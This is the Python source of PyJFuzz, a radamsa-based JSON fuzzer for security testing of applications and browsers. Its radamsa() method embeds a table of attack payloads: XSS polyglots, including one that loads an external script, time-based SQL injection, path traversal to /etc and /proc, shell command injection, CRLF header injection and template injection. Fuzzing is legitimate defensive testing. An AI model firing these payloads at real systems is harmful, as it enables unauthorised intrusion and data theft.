#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
PyJFuzz trivial python fuzzer based on radamsa.

MIT License

Copyright (c) 2016 Daniele Linguaglossa <d.linguaglossa@mseclab.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NON INFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import subprocess
import json
import random
import string
import gc
import urllib
import sys
import argparse
import time
import socket
import signal
import tempfile
import os
from distutils.version import LooseVersion

__version__ = "1.0.0"
__author__ = "Daniele 'dzonerzy' Linguaglossa"
__mail__ = "d.linguaglossa@mseclab.com"


class JSONFactory:
    fuzz_factor = None
    was_array = None
    is_fuzzed = None
    params = None
    strong_fuzz = False
    techniques = {
        "C": [10, 5],
        "H": [9],
        "P": [6, 2],
        "T": [11, 12],
        "R": [13],
        "S": [3, 1],
        "X": [0, 4, 7, 8]
    }
    behavior = {
        int: 10,
        bool: 10,
        str: 10,
        unicode: 10,
        None: 10,
        float: 10,
    }
    behavior_based = False
    tech = []
    debug = False
    exclude = False
    callback = None

    def __init__(self, techniques=None, params=None, strong_fuzz=False, behavior_based=False, debug=False,
                 exclude=False):
        """
        Init the main class used to fuzz
        :param techniques: A string indicating the techniques that should be used while fuzzing (all if None)
        :param params: A list of parametrs to fuzz (all if None)
        :return: A class object
        """
        if behavior_based and (techniques is not None or params is not None or strong_fuzz is not False):
            raise EnvironmentError("No other options must be specified while using behavior-based fuzzing!\n\n")
        if strong_fuzz and (techniques is not None or params is not None or behavior_based is not False):
            raise EnvironmentError("No other options must be specified while using strong fuzzing!\n\n")
        self.behavior_based = behavior_based
        self.strong_fuzz = strong_fuzz
        self.params = params.split(",") if params is not None else params
        self.tech = list(techniques) if techniques is not None else []
        self.fuzz_factor = 0
        self.is_fuzzed = False
        self.was_array = False
        self.debug = debug
        self.exclude = exclude
        try:
            ver = subprocess.Popen(["radamsa", "-V"], stdout=subprocess.PIPE).communicate()[0]
            if debug:
                sys.stderr.write("[DEBUG] PyJFuzz version ({0})\n".format(__version__))
                sys.stderr.write("[DEBUG] Using ({0})\n".format(ver.strip("\n")))
                sys.stderr.write("[DEBUG] Arguments ({0})\n".format(self.repr(self.__dict__)))
        except OSError:
            raise OSError("Radamsa was not found, Please install it!\n\n")

    def initWithJSON(self, json_obj):
        """
        Init the class with the base object, let's call this "test-case"
        :param json_obj: The object needed to initialize the fuzzing process, this is also the base object
        :return: None
        """
        fuzz_factor = self.fuzz_factor
        params = self.params
        tech = self.tech
        techniques = self.techniques
        strong_fuzz = self.strong_fuzz
        behavior_based = self.behavior_based
        behavior = self.behavior
        debug = self.debug
        exclude = self.exclude
        callback = None
        try:
            self.__dict__ = json.loads(json_obj)
        except TypeError:
            self.__dict__ = json.loads("{\"array\": %s}" % json_obj)
            self.was_array = True
        except ValueError:
            self.__dict__ = {"dummy": "dummy"}
        self.params = params
        self.fuzz_factor = fuzz_factor
        self.is_fuzzed = False
        self.techniques = techniques
        self.strong_fuzz = strong_fuzz
        self.behavior = behavior
        self.behavior_based = behavior_based
        self.debug = debug
        self.exclude = exclude
        self.callback = callback
        if len(tech) != 0:
            for t in tech:
                if t in self.techniques.keys():
                    self.tech += self.techniques[t]
        self.__dict__.update({"tech": self.tech})

    def ffactor(self, factor):
        """
        Set the fuzz_factor variable to instruct the fuzzer "how much" to fuzz
        :param factor: fuzz_factor value
        :return: None
        """
        if factor not in range(0, 7):
            raise ValueError("Factor must be between 0-6")
        if self.debug:
            sys.stderr.write("[DEBUG] Setting Fuzz factor to ({0})\n".format(factor))
        self.fuzz_factor = factor

    @staticmethod
    def _json_dumps(json_object, indent=0):
        """
        Return the fuzzed object and replace each non-printable character using unicode escape
        :param json_object: the fuzzed object
        :param indent: indent if needed
        :return: fuzzed object with escaped values
        """
        replacements = {
            "\\\\u": "\\u",
        }
        if bool(indent):
            json_object = json.dumps(json_object, indent=indent)
        else:
            json_object = json.dumps(json_object, separators=(',', ':'))
        for replacement in replacements:
            json_object = json_object.replace(replacement, replacements[replacement])
        return json_object

    def fuzz(self, indent=0):
        """
        Fuzz the object inserted by initWithJSON
        :param indent: indent if needed
        :return: String representing the fuzzed object
        """
        start_time = time.time()
        if self.strong_fuzz:
            return self.statistics(start_time, self.fuzz_elements(self.__dict__, self.fuzz_factor), debug=self.debug)
        return self.statistics(start_time, self._json_dumps(
            self.fuzz_elements(self.__dict__, self.fuzz_factor), indent=indent), debug=self.debug)

    def fuzz_command_line_callback(self, func):
        """
        Set a callback fro fuzz_command_line function
        :param func: A callback receiving a process object
        :return: None
        """
        if callable(func):
            self.callback = func
        else:
            raise TypeError("Func must be a callable object e.g. function!")

    def fuzz_command_line(self, command):
        """
        Execute command and pass an argument to a fuzzed JSON file
        :param command: command to execute
        :return: None
        """
        tech = self.tech if len(self.tech) != 0 else None
        js = JSONFactory(techniques=tech, params=self.params, strong_fuzz=self.strong_fuzz, exclude=self.exclude)
        js.initWithJSON(json.dumps(self.clean_result(self.__dict__)))
        temp = tempfile.NamedTemporaryFile(delete=False)
        name = temp.name
        sys.stdout.write("[INFO] Generated temp file '%s'\n" % name)
        temp.write(js.fuzz())
        temp.close()
        for cmd in command:
            if "@@" in cmd:
                command[command.index(cmd)] = command[command.index(cmd)].replace("@@", name)
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if self.callback is not None:
                    self.callback(name, process)
                process.wait()
                if process.returncode == -11:
                    sys.stdout.write("[ALERT] Process crashed with SIGSEGV\n")
                    return
                else:
                    sys.stdout.write("[ALERT] Process exited with %d\n" % process.returncode)
                os.unlink(name)
                return
            else:
                pass
        raise ValueError("Please specify @@ position while using -c switch!")

    def fuzz_elements(self, elements, factor):
        """
        Fuzz every element specified by elements and self.params (all if None)
        :param elements: the main base object, self.__dict__ by default
        :param factor: the fuzz_factor variable used while fuzzing
        :return: return a object representing the fuzzed JSON object
        """
        if self.debug:
            sys.stderr.write("[DEBUG] Start fuzzing process\n")
        if self.is_fuzzed:
            raise ValueError("You cannot fuzz an already fuzzed object please call 'initWithJSON'")
        if self.strong_fuzz:
            result = self.clean_result(dict(self.__dict__))
            if self.was_array:
                return self._radamsa(json.dumps(result["array"]))
            return self._radamsa(json.dumps(result))
        else:
            for element in elements.keys():
                if element in ["fuzz_factor", "was_array", "is_fuzzed", "params", "techniques", "tech", "strong_fuzz",
                               "behavior", "behavior_based", "debug", "exclude", "callback"]:
                    pass
                else:
                    if self.params is not None and self.check_params(element):
                        pass
                    else:
                        if type(elements[element]) == dict:
                            self.fuzz_elements(elements[element], factor)
                        elif type(elements[element]) == list:
                            elements[element] = self.fuzz_array(elements[element], factor)
                        elif type(elements[element]) == int:
                            if self.is_behavior_fuzz(int):
                                elements[element] = self.fuzz_int(elements[element], self.fuzz_behavior(int))
                        elif type(elements[element]) == float:
                            if self.is_behavior_fuzz(float):
                                elements[element] = self.fuzz_float(elements[element], self.fuzz_behavior(float))
                        elif type(elements[element]) == bool:
                            if self.is_behavior_fuzz(bool):
                                elements[element] = self.fuzz_bool(elements[element], self.fuzz_behavior(bool))
                        elif type(elements[element]) == unicode:
                            if self.is_behavior_fuzz(unicode):
                                elements[element] = self.fuzz_string(elements[element], self.fuzz_behavior(unicode))
                        elif type(elements[element]) == str:
                            if self.is_behavior_fuzz(str):
                                elements[element] = self.fuzz_string(elements[element], self.fuzz_behavior(str))
                        elif elements[element] is None:
                            if self.is_behavior_fuzz(None):
                                elements[element] = self.fuzz_null(elements[element], self.fuzz_behavior(None))
            result = self.clean_result(dict(self.__dict__))
            if self.was_array:
                return result["array"]
            self.is_fuzzed = True
            return result

    def fuzz_null(self, fuzz_null, factor):
        """
        Fuzz the null value
        :param fuzz_null: Original value (None by default)
        :param factor: The fuzz_factor
        :return: Fuzzed value
        """
        actions = {
            0: lambda x: float('nan'),
            1: lambda x: int(bool(x)),
            2: lambda x: bool(x),
            3: lambda x: float('+inf'),
            4: lambda x: {},
            5: lambda x: [int(bool(x))],
            6: lambda x: float('-inf')
        }
        return actions[random.randint(0, factor)](fuzz_null)

    def fuzz_array(self, arr, factor):
        """
        Fuzz a base array
        :param arr: original value
        :param factor: The fuzz_factor
        :return: Fuzzed array
        """
        tmp_arr = list(arr)
        for element in tmp_arr:
            if type(element) == str:
                if self.is_behavior_fuzz(str):
                    arr[arr.index(element)] = self.fuzz_string(element, self.fuzz_behavior(str))
            if type(element) == unicode:
                if self.is_behavior_fuzz(unicode):
                    arr[arr.index(element)] = self.fuzz_string(element, self.fuzz_behavior(unicode))
            elif type(element) == int:
                if self.is_behavior_fuzz(int):
                    arr[arr.index(element)] = self.fuzz_int(element, self.fuzz_behavior(int))
            elif type(element) == float:
                if self.is_behavior_fuzz(float):
                    arr[arr.index(element)] = self.fuzz_float(element, self.fuzz_behavior(float))
            elif type(element) == bool:
                if self.is_behavior_fuzz(bool):
                    arr[arr.index(element)] = self.fuzz_bool(element, self.fuzz_behavior(bool))
            elif element is None:
                if self.is_behavior_fuzz(None):
                    arr[arr.index(element)] = self.fuzz_null(element, self.fuzz_behavior(None))
            elif type(element) == list:
                arr[arr.index(element)] = self.fuzz_array(element, factor)
            elif type(element) == dict:
                tmp_fuzz = JSONFactory(techniques=self.techniques, params=self.params,
                                       behavior_based=self.behavior_based)
                tmp_fuzz.initWithJSON(json.dumps(element))
                tmp_fuzz.ffactor(self.fuzz_factor)
                arr[arr.index(element)] = json.loads(tmp_fuzz.fuzz())
        return arr

    def fuzz_string(self, fuzz_string, factor):
        """
        Fuzz a base string
        :param fuzz_string: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed string
        """
        actions = {
            0: lambda x: x[::-1],
            1: lambda x: self.radamsa(x),
            2: lambda x: "",
            3: lambda x: [x],
            4: lambda x: False,
            5: lambda x: {"param": self.radamsa(x)},
            6: lambda x: 0,
        }
        return actions[random.randint(0, factor)](fuzz_string)

    def fuzz_bool(self, boolean, factor):
        """
        Fuzz a base boolean
        :param boolean: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed boolean
        """
        actions = {
            0: lambda x: not x,
            1: lambda x: str(x),
            2: lambda x: str(not x),
            3: lambda x: int(x),
            4: lambda x: int(not x),
            5: lambda x: float(x),
            6: lambda x: float(not x),
        }
        return actions[random.randint(0, factor)](boolean)

    def fuzz_int(self, num, factor):
        """
        Fuzz a base integer
        :param num: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed integer
        """
        actions = {
            0: lambda x: x ^ 0xffffff,
            1: lambda x: -x,
            2: lambda x: "%s" % x,
            3: lambda x: x | 0xff,
            4: lambda x: random.randint(-2147483647, 2147483647),
            5: lambda x: bool(x),
            6: lambda x: x | 0xff000000
        }
        return actions[random.randint(0, factor)](num)

    def fuzz_float(self, num, factor):
        """
        Fuzz a base float
        :param num: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed float
        """
        actions = {
            0: lambda x: float(int(round(x, 0)) ^ 0xffffff),
            1: lambda x: -x,
            2: lambda x: "%s" % x,
            3: lambda x: float(int(round(x, 0)) | 0xff),
            4: lambda x: float(random.randint(-2147483647, 2147483647)*0.1),
            5: lambda x: bool(round(x, 0)),
            6: lambda x: float(int(round(x, 0)) | 0xff000000)
        }
        return actions[random.randint(0, factor)](num)

    def clean_result(self, result):
        """
        Clean the fuzzed object from useless properties
        :param result: The fuzzed object
        :return: Fuzzed object
        """
        del result["fuzz_factor"]
        del result["is_fuzzed"]
        del result["params"]
        del result["techniques"]
        del result["tech"]
        del result["strong_fuzz"]
        del result["behavior"]
        del result["behavior_based"]
        del result["debug"]
        del result["exclude"]
        del result["callback"]
        return result

    def is_behavior_fuzz(self, kind):
        """
        Check if element of "kind" should be fuzzed due to behavior weight
        :param kind: Type of analyzed element
        :return: True or False
        """
        if self.behavior_based:
            return 0 <= random.randint(1, 10) <= self.behavior[kind]
        else:
            return True

    def sensible_behavior(self, kind, plus_factor=0.1, minus_factor=0.1):
        """
        Add a weight to a type due to strange behavior
        :param kind: Type of analyzed element
        :return: None
        """
        for _kind in self.behavior.keys():
            if _kind != kind:
                if self.behavior[_kind]-minus_factor >= 1:
                    self.behavior[_kind] -= minus_factor
                else:
                    self.behavior[_kind] = 0
            else:
                if self.behavior[_kind]+plus_factor <= 10:
                    self.behavior[_kind] += plus_factor
                else:
                    self.behavior[_kind] = 10

    def fuzz_behavior(self, kind):
        """
        Calculate a new fuzz_factor based on behavior weight
        :param kind: Type of analyzed element
        :return: New fuzz_factor value
        """
        if self.behavior_based:
            if self.behavior[kind] == 10:
                return self.fuzz_factor
            else:
                return int((6 * self.behavior[kind]) / 10)
        else:
            return self.fuzz_factor

    def check_params(self, element):
        """
        Check against parameters from -p switch if element should be fuzzed,
        :param element: current parameter
        :return: True or False
        """
        if self.exclude:
            return element in self.params
        else:
            return element not in self.params

    def _radamsa(self, to_fuzz):
        """
        Fuzz a base string using radamsa fuzzed
        :param to_fuzz: Original value
        :return: A fuzzed string
        """
        process = subprocess.Popen(["radamsa"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        process.stdin.write(to_fuzz)
        output = process.communicate()[0]
        process.stdout.close()
        del process
        return "".join(x if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)

    def radamsa(self, to_fuzz):
        """
        Fuzz a base string using radamsa fuzzed
        :param to_fuzz: Original value
        :return: A fuzzed string
        """

        encoding = lambda x: "\\u00%02x;" % ord(x)

        attacks = {
            0: "jaVasCript:/*-/*\\u0060/*\\\\u0060/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</tit"
               "Le/</teXtarEa/</scRipt/--!>\\u003csVg/<sVg/oNloAd=alert(\%s\)//>\\u003e",
            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
               "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
               "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
            2: "/../../../../etc/%s",
            3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
            4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
               "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
            5: "%s&sleep 5&id'\\\"\\u00600&sleep 5&id\\u0060'",
            6: "..\\..\\..\\..\\%s.ini",
            7: "data:text/html,https://%s:a.it@www.\\it",
            8: "file:///proc/self/%s",
            9: "\\u000d\\u00a0BB: %s@mail.it\\u000d\\u000aLocation: www.google.it",
            10: "||cmd.exe&&id||%s",
            11: "${7*7}a{{%s}}b",
            12: "{{'%s'*7}}",
            13: "".join(string.printable.strip("\t\n\r\x0b\x0c")[random.randint(0, 93)]
                        for _ in range(0, random.randint(1, 30))).replace("%", "") + "%s"
        }
        if len(self.tech) == 0:
            attack = attacks[random.randint(0, 13)]
        else:
            attack = attacks[random.choice(self.tech)]
        to_fuzz = attack % "".join(encoding(x) for x in to_fuzz)
        process = subprocess.Popen(["radamsa"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        process.stdin.write(to_fuzz)
        output = process.communicate()[0]
        process.stdout.close()
        del process
        return "".join(encoding(x) if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)

    def statistics(self, start, result, debug=False):
        """
        Fuzzing time statistics
        :param start: start time
        :param result: The fuzzed object
        :param debug: debug boolean
        :return: The fuzzed object
        """
        if debug:
            sys.stderr.write("[DEBUG] Fuzzing completed took ({0} sec)\n\n".format(round(time.time()-start, 4)))
        return result

    def repr(self, properties):
        """
        Represent a dict with key => value
        :param properties: dict with properties
        :return: String
        """
        representation = "\n"
        for element in properties.keys():
            representation += "%s => %s\n" % (element, properties[element])
        return representation

    def start_server(self, ip_port):
        """
        Built-in server used to fuzz browser or client app
        :param ip_port: ip/port
        :return: None
        """
        from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        from SocketServer import ThreadingMixIn

        ip, port = ip_port.split(":")
        fuzz_factor = self.fuzz_factor
        techniques = None if len(self.tech) == 0 else self.tech
        params = self.params
        strong_fuzz = self.strong_fuzz
        exclude = self.exclude
        org_json = json.dumps(self.clean_result(self.__dict__))

        def stop_server(*arguments):
            sys.stdout.write("\n[INFO] Stopping built-in server...\n")
            sys.exit(-1)

        class Handler(BaseHTTPRequestHandler):
            obj = JSONFactory(techniques=techniques, params=params, strong_fuzz=strong_fuzz, exclude=exclude)

            def do_GET(self):
                self.obj.initWithJSON(org_json)
                self.obj.ffactor(fuzz_factor)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(self.obj.fuzz(indent=5))
                self.wfile.write('\n')
                return

            def do_POST(self):
                self.do_GET()

            def do_PUT(self):
                self.do_GET()

        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
            """Handle requests in a separate thread."""

        signal.signal(signal.SIGINT, stop_server)
        server = ThreadedHTTPServer((ip, int(port)), Handler)
        sys.stdout.write("[INFO] Starting built-in server, use <Ctrl-C> to stop\n")
        server.serve_forever()

    @staticmethod
    def check_address_port(value):
        """
        Check validity of ip/port
        :param value: ip and port value
        :return: Parser Exception or correct value
        """
        try:
            ip, port = value.split(":")
            int(port) if int(port) <= 65535 else int("error")
            try:
                socket.inet_pton(socket.AF_INET, ip)
            except AttributeError:
                try:
                    socket.inet_aton(ip)
                except socket.error:
                    raise BaseException
            except:
                raise BaseException
        except BaseException:
            raise parser.error("Please insert a valid <ip:port> value!")
        return value

if __name__ == "__main__":
    sys.stderr.write("PyJFuzz v{0} - {1} - {2}\n\n".format(__version__, __author__, __mail__))
    parser = argparse.ArgumentParser(description='Trivial Python JSON Fuzzer (c) DZONERZY',
                                     formatter_class=argparse.RawTextHelpFormatter)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-j', metavar='JSON', help='Original JSON serialized object', type=str, default=None)
    group.add_argument('-F', metavar='FILE', help='Fuzz a file', type=str, default=None)
    group.add_argument('--update', action='store_true', help='Check for updates', dest='update', default=False,
                       required=False)
    parser.add_argument('-p', metavar='PARAMS', help='Parameters comma separated', required=False, default=None)
    parser.add_argument('-t', metavar='TECHNIQUES', help='Techniques "CHPTRSX"\n\n'
                                                         'C - Command Execution\n'
                                                         'H - Header Injection\n'
                                                         'P - Path Traversal\n'
                                                         'T - Template Injection\n'
                                                         'R - Random Characters\n'
                                                         'S - SQL Injection\n'
                                                         'X - XSS\n\n', required=False, default=None)
    parser.add_argument('-f', metavar='FUZZ_FACTOR', help='Fuzz factor [0-6]', type=int, default=6, required=False)
    parser.add_argument('-i', metavar='INDENT', help='JSON indent number', type=int, default=0, required=False)
    parser.add_argument('-ue', action='store_true', help='URLEncode result', dest='ue', default=False, required=False)
    parser.add_argument('-d', action='store_true', help='Enable fuzzing Debug', dest='d', default=False, required=False)
    parser.add_argument('-s', action='store_true', help='Strong fuzz without maintaining structure', dest='s',
                        default=False, required=False)
    parser.add_argument('-x', action='store_true', help='Exclude params selected by -p switch', dest='x',
                        default=False, required=False)
    parser.add_argument('-ws', metavar='IP:PORT', help='Enable built-in REST API server', dest='ws',
                        type=JSONFactory.check_address_port, default=False, required=False)
    parser.add_argument('-c', action='store_true', help='Execute the command specified by positional args, use @@'
                        ' to indicate filename', dest='c', default=False, required=False)
    parser.add_argument('command', nargs='*')
    args = parser.parse_args()
    obj = JSONFactory(techniques=args.t, params=args.p, strong_fuzz=args.s, debug=args.d, exclude=args.x)
    if args.update:
        sys.stdout.write("[INFO] Checking updates...\n")
        temp_name = next(tempfile._get_candidate_names())
        os.chdir(tempfile.gettempdir())
        process = subprocess.Popen(["wget", "https://raw.githubusercontent.com/mseclab/PyJFuzz/master/pyjfuzz.py", "-O",
                                    "%s.py" % temp_name], stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
        process.wait()
        if process.returncode == 0:
            update = subprocess.Popen(["python", "-c", "import sys;from %s import __version__; "
                                                       "sys.stdout.write(__version__)" % temp_name],
                                      stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            v = update.communicate()[0]
            update.wait()
            if update.returncode == 0:
                if LooseVersion(v) > LooseVersion(__version__):
                    sys.stdout.write("[INFO] Found an update! PyJFuzz v%s\n" % v)
                    sys.stdout.write("[INFO] Downloading and installing via git, you may be asked to provide "
                                     "root password\n")
                    git = subprocess.Popen(["git", "clone", "https://github.com/mseclab/PyJFuzz.git"],
                                           stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    git.wait()
                    if git.returncode == 0:
                        os.chdir(os.path.join(tempfile.gettempdir(), "PyJFuzz"))
                        sys.stdout.write("[INFO] Download finished, Installing...\n")
                        install = subprocess.Popen(["sudo", "python", "setup.py", "install"], stdout=subprocess.PIPE, 
                                                   stderr=subprocess.PIPE)
                        install.wait()
                        if install.returncode == 0:
                            sys.stdout.write("[INFO] Installation completed! Please restart PyJFuzz\n")
                        else:
                            sys.stdout.write("[ERROR] An error occurred during installation :(\n")
                    else:
                        sys.stdout.write("[ERROR] An error occurred during download, try manually :(\n")
                else:
                    sys.stdout.write("[INFO] Currently there are no new updates, try again later :)\n")
            else:
                sys.stdout.write("[ERROR] Cannot find updated version\n")
        else:
            sys.stdout.write("[ERROR] Project unavailable, please retry again later\n")
        subprocess.Popen(["sudo", "rm", "-r", "%s.py" % temp_name], stdout=subprocess.PIPE, 
                         stderr=subprocess.PIPE).communicate()
        subprocess.Popen(["sudo", "rm", "-r", "PyJFuzz"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        sys.exit(-1)
    if args.F is not None:
        try:
            with file(args.F, "r+") as fuzz_file:
                obj.initWithJSON(urllib.unquote(fuzz_file.read()))
                obj.ffactor(args.f)
                with file(args.F, "w+") as fuzz:
                    if args.ue:
                        fuzz.write(urllib.quote(obj.fuzz()))
                    else:
                        if args.i == 0:
                            fuzz.write(obj.fuzz())
                        else:
                            fuzz.write(obj.fuzz(args.i))
        except IOError:
            sys.stderr.write("[ERROR] File '%s' not found!\n\n" % args.F)
    else:
        obj.initWithJSON(args.j)
        obj.ffactor(args.f)
        if args.ws:
            obj.start_server(args.ws)
        elif args.c:
            obj.fuzz_command_line(args.command)
        elif args.ue:
            sys.stdout.write(urllib.quote(obj.fuzz()))
        else:
            if args.i == 0:
                sys.stdout.write(obj.fuzz())
            else:
                sys.stdout.write(obj.fuzz(args.i))
    gc.collect()
